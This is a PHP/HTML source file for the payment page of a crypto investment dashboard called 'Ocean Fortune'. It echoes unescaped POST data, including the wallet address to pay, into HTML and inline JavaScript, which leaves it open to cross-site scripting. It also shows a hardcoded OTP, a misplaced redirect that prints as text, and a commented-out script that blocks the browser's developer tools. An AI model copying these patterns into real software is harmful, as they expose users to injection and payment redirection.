
<?php

session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $selectedCryptoData = isset($_POST['selectedCryptoData']) ? $_POST['selectedCryptoData'] : null;

    $crypto = json_decode($selectedCryptoData, true);
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
      <!-- ============TITLE============= -->
      <title>Ocean Fortune</title>
  
      <!-- ============HEAD-ICON-LOGO============= -->
      <link rel="icon" type="image/png" href="assets/images/logo.png">
  
      <!-- ============CSS-LINKS============= -->
      <link rel="stylesheet" href="assets/css/payment.css">
      <link rel="stylesheet" href="assets/css/style.css">
      <link rel="stylesheet" href="assets/css/table-wallet.css">
      <link rel="stylesheet" href="assets/css/mediaquery.css">
      <link rel="stylesheet" href="assets/css/main-mediaquery.css">
      <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/5.4.5/css/swiper.css">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.2.0/remixicon.min.css">
      <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
  
  
  
      <!-- ============FONT-AWESOME-LINKS============= -->
      <link rel="stylesheet" href="assets/font-awesome/css/font-awesome.min.css">
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

  

      <noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>

  </head>


  
        <?php
            
            include 'session_handler.php';

        ?>
    
    <style>
      html{
        animation: none;
      }

    </style>


<body>
    
      <header class="dashboard_header">
          <div class="wrapper">
            <div class="logo">
              <div class="image_wrapper">
                  <img src="assets/images/logo.png" width="42" height="42" alt="">
              </div>
            </div>

            <div class="icons">
              <ul>
                  <li class=""><a href="#"><i class="material-icons notification-icon">notifications_none</i></a>
                      <div class="notification_box">
                        <div class="wrapper">
                          <header>
                              <span style="color: #fff;">Notifications</span>
                              <a href="#">Clear All</a>
                          </header>
                          
                          <ul>
                              <li>
                                  <a href="#">
                                      <i class="fa fa-user"></i>
                                      <span>Your OTP is <p>487887</p></span>
                                  </a>
                              </li>
                          </ul>

                          <div class="view_all"><a href="#">View All</a></div>
                        </div>
                      </div>
                  </li>

                  <li><a><i class="material-icons account-icon">account_circle</i></a>
                      <div class="profile_box">
                          <ul>
                              <li>
                                  <a href="profile.php">
                                      <i class="material-icons">person_outline</i>
                                      <span>Profile </span>
                                  </a>
                              </li>
                              <li>
                                  <a href="#">
                                      <i class="material-icons">account_balance_wallet</i>
                                      <span>Wallet</span>
                                  </a>
                              </li>
                              <li>
                                  <a href="logout.php">
                                      <i class="material-icons">logout</i>
                                      <span>Logout</span>
                                  </a>
                              </li>
                          </ul>
                      </div>

                      
                  </li>

                
              </ul>
            </div>
          </div>


        <!-- ============ CRYPTO STICKER ============= //--AT THE TOP, BELOW THE NAV BAR--//-->
        <div class="crypto-ticker">
          <div style="height:62px; background-color: #1e293b; overflow:hidden; box-sizing: border-box; border: 1px solid #282E3B; border-radius: 4px; text-align: right; line-height:14px; block-size:62px; font-size: 12px; font-feature-settings: normal; text-size-adjust: 100%; box-shadow: inset 0 -20px 0 0 #262B38;padding:1px;padding: 0px; margin: 0px; width: 100%;">
              <div style="height:40px; padding:0px; margin:0px; width: 100%;">
                  <iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&amp;theme=dark&amp;pref_coin_id=1505&amp;invert_hover=no" width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;"></iframe>
                  <!-- <script>
                      document.addEventListener('contextmenu', (event) => event.preventDefault());
                          document.onkeydown = function(e) {
                              // Disable F12, Ctrl+Shift+I (Inspector), Ctrl+Shift+J (Console), Ctrl+U (View Source)
                              if (e.keyCode == 123 || // F12
                                  (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
                                  (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) || // Ctrl+Shift+J
                                  (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) { // Ctrl+U
                                  return false; // Prevent the event
                              }
                          };
                  </script> -->
              </div>
              <div style="color: #1e293b; line-height: 14px; font-weight: 400; font-size: 11px; box-sizing: border-box; padding: 2px 6px; width: 100%; font-family: Verdana, Tahoma, Arial, sans-serif;">
                  <a href="https://coinlib.io" target="_blank" style="font-weight: 500; color: #626B7F; text-decoration:none; font-size:11px"></a>
              </div>
          </div>
        </div>
      </header>



    
        
            
      <aside class="sidebar">
          <div class="wrapper">

            
              <div class="sidebar_menu">
                        
                  <ul>
                      <li>
                          <a href="dashboard.php">
                              <i class="material-icons">dashboard</i>
                              <span>Home</span>
                          </a>
                      </li>
                      <li>
                          <a href="swap.php">
                              <i class="material-icons">swap_calls</i>
                              <span>Swap</span>
                          </a>
                      </li>
                      <li>
                          <a href="#">
                              <i class="material-icons">history</i>
                              <span>History</span>
                          </a>
                      </li>
                      <li>
                          <a href="#">
                              <i class="material-icons">widgets</i>
                              <span>Features</span>
                          </a>
                      </li>
                      <li>
                          <a href="#">
                              <i class="material-icons">store</i>
                              <span>Market</span>
                          </a>
                      </li>
                  </ul>
              </div>

              <div class="sidebar_widgets">
                <div class="wrapper">
                  <div class="image">
                    <img src="assets/images/crypto-join.png" alt="">
                  </div>
                  <div class="text">
                    <h3>Invest Now!</h3>
                    <a href="">
                      Buy and Sell Coins
                    </a>
                    <br><br>
                  </div>
                </div>
              </div>
          </div>
      </aside>

      <?php if ($crypto): ?>
      <!-- THIS IS RENDERED ONLY IF THE "$crypto" EXISTS -->
        <main class="main_content">
            <div class="app-container">
                <div class="payment-container">
                    <div class="payment-card">

                          <!-- WARNING  -->
                        <div class="warning-banner">
                            <i class="fa fa-info-circle"></i>
                            <span>Only send <samp><?= $crypto['symbol'] ?></samp> assets to this address. Other assets will be lost forever</span>
                        </div>


                        <div class="crypto-amount">

                            <!-- CRYPTO SYMBOL -->
                            <div class="crypto-icon">
                                <?php if (isset($crypto['imageUrl'])): ?>
                                    <img src="<?= $crypto['imageUrl'] ?>" alt="<?= $crypto['symbol'] ?>" width="50">
                                <?php endif; ?>
                                <span style="color: var(--secondary-text);"><?= $crypto['name'] ?><samp class="crypto-currency"> (<?= $crypto['symbol'] ?>)</samp></span>
                            </div>

                            <!-- AMOUNT TO PAY -->
                            <div class="amount-display">
                                <h4 class="crypto-price"></h4>
                                <span style="color: #fff;" class="dollar-amount">≈ <samp>$</samp><?= $crypto['amount'] ?></span>
                          
                            </div>

                        </div>




                        
                        <!--WALLET ADDRESS  -->
                        <div class="wallet-address">
                            <input type="text" id="wallet" value="<?= $crypto['wallet'] ?>" readonly disabled>
                        </div>


                        <div class="action-buttons">

                            <!--  COPY WALLET ADDRESS-->
                            <button class="action-btn copy-btn" onclick="copyToClipboard()">
                                <i class="fa fa-clipboard"></i>
                                <span>Copy</span>
                            </button>


                            <!-- PAYMENT BUTTON FOR BACKEND  -->
                            <button class="action-btn paid-btn" id="paidButton">
                                <i class="fa fa-check"></i>
                                <span>Paid</span>
                            </button>
                            
                            
                             <!-- GO BACK TO THE PREVIOUS PAGE -->
                             <button class="action-btn back-btn" id="backButton">
                                <i class="fa fa-backward"></i>
                                <span>Back</span>
                            </button>
                            <script>
                                document.addEventListener("DOMContentLoaded", function () {
                                    // Back button functionality
                                    document.getElementById("backButton").onclick = function (event) {
                                        event.preventDefault();
                                        window.history.back();
                                    };

                                    // Paid button functionality
                                    document.getElementById("paidButton").addEventListener("click", function () {
                                        const transactionId = "<?= uniqid('txn_') ?>"; // Generating the unique transaction ID
                                        const cryptoSymbol = "<?= $crypto['symbol'] ?>";
                                        const amount = "<?= $crypto['amount'] ?>";
                                        const walletAddress = "<?= $crypto['wallet'] ?>";
                                        const userId = "<?= $_SESSION['user_id'] ?>"; // Fetching the user ID from the session
                                        console.log("Sending data to the server...");


                                        // Send the data to the server (process_payment.php)
                                        fetch("send_payment_logic.php", {
                                            method: "POST",
                                            headers: {
                                                "Content-Type": "application/json",
                                            },
                                            body: JSON.stringify({
                                            transactionId: transactionId,
                                            cryptoSymbol: cryptoSymbol,
                                            amount: amount,
                                            walletAddress: walletAddress,
                                            // Including the user ID
                                        }),
                                        })
                                            .then((response) => response.json())
                                            .then((data) => {
                                                if (data.success) {
                                                    alert("Withdrawal is pending, waiting for admin approval.");
                                                    window.location.href = "send.php"; // Redirect to deposit page
                                                } else {
                                                    alert("Error: " + (data.error || "There was an error processing your payment,please submit your KYC."));
                                                
                                                }
                                            })
                                            .catch((error) => {
                                                console.error("Error:", error);
                                                alert("An error occurred. Please try again later.");
                                            });
                                    });
                                });
                            </script>



                        </div>
                    </div>
                </div>
            </div>
        </main>


    <?php else: ?>
        header('Location: deposit.php');
        
    <?php endif; ?>

      

      
      
       <footer class="dashboard_footer">
        <div class="wrapper">
          <span>© 2024 <a href="index.php">Creative Fortune</a>All Right Reserved</span>
          <span><a href="#">Purchase Now</a></span>
        </div>
      </footer>

      <section class="bottom_nav">
        <div class="wrapper">
            <ul>
                <li>
                    <a href="dashboard.php">
                        <i class="material-icons">dashboard</i>
                        <span>Home</span>
                    </a>
                </li>
            </ul>

            <ul>
                <li>
                    <a href="swap.php">
                        <i class="material-icons">swap_calls</i>
                        <span>Swap</span>
                    </a>
                </li>
            </ul>

            <ul>
                <li>
                    <a href="dashboard.php">
                        <i class="material-icons">history</i>
                        <span>History</span>
                    </a>
                </li>
            </ul>

            <ul>
                <li>
                    <a href="dashboard.php">
                        <i class="material-icons">widgets</i>
                        <span>Features</span>
                    </a>
                </li>
            </ul>

            <ul>
                <li>
                    <a href="dashboard.php">
                        <i class="material-icons">store</i>
                        <span>Market</span>
                    </a>
                </li>
            </ul>
        </div>
      </section>



    <!-- ============JAVASCRIPT-LINKS============= -->
    <script src="assets/user/javascript/popup.js"></script>
    <script src="assets/user/javascript/function.js"></script>
    <script>
        const symbolToId = {
            BTC: "bitcoin",
            USDT: "tether",
            ETH: "ethereum",
            DOGE: "dogecoin",
            BNB: "binancecoin",
            SHIB: "shiba-inu",
            LTC: "litecoin",
            XRP: "ripple"
        };

        const loadingSpinner = `<svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 50 50" style="animation: spin 1.5s linear infinite;">
            <circle cx="25" cy="25" r="20" stroke="#fff" stroke-width="5" fill="none"/>
            <circle cx="25" cy="25" r="20" stroke="#00c853" stroke-width="5" fill="none" stroke-dasharray="125.6" stroke-dashoffset="125.6" style="animation: dash 1.5s ease-in-out infinite;"></circle>
            </svg>`;

        const style = document.createElement('style');
        style.innerHTML = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            @keyframes dash {
                0% { stroke-dashoffset: 125.6; }
                50% { stroke-dashoffset: 31.4; }
                100% { stroke-dashoffset: 125.6; }
            }
        `;

        document.head.appendChild(style);

        async function fetchCryptoPrice() {
            const cryptoCurrency = document.querySelector(`.crypto-currency`);
            const dollarAmount = document.querySelector(`.dollar-amount`);
            const cryptoPrice = document.querySelector(`.crypto-price`);

            const cryptoCode = cryptoCurrency.innerText.replace(/[()]/g, '').trim();
            if (symbolToId[cryptoCode]) {
                const amountInDollars = parseFloat(dollarAmount.innerText.replace(/[^\d.]/g, ''));
    
                const cryptoId = symbolToId[cryptoCode];
                cryptoPrice.innerHTML = loadingSpinner;
    
                try {
                    const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${cryptoId}&vs_currencies=usd`);
                    const data = await response.json();
    
                    if (data[cryptoId] && data[cryptoId].usd) {
                        const cryptoPriceInUSD = data[cryptoId].usd;
    
                        const cryptoAmount = amountInDollars / cryptoPriceInUSD;
    
                        cryptoPrice.innerHTML = `${cryptoAmount.toFixed(6)} ${cryptoCode}`;
                    } else {
                        cryptoPrice.innerHTML = "Price data not available.";
                    }
                } catch (error) {
                    console.error("Error fetching price data:", error);
                    cryptoPrice.classList.add("error")
                    cryptoPrice.innerHTML = "Error fetching price data.";
                }
            } else {
                cryptoPrice.innerHTML = "Currency not supported.";
            }

        }
        fetchCryptoPrice();

        function copyToClipboard() {
            const wallet = document.getElementById("wallet");
            const walletAddress = wallet.value;
            navigator.clipboard.writeText(walletAddress).then(() => {
                window.alert('Copied to clipboard');
            }).catch(err => {
                window.alert('Failed to copy to clipboard: ' + err);
            });
        }
    </script>




</body>
</html>

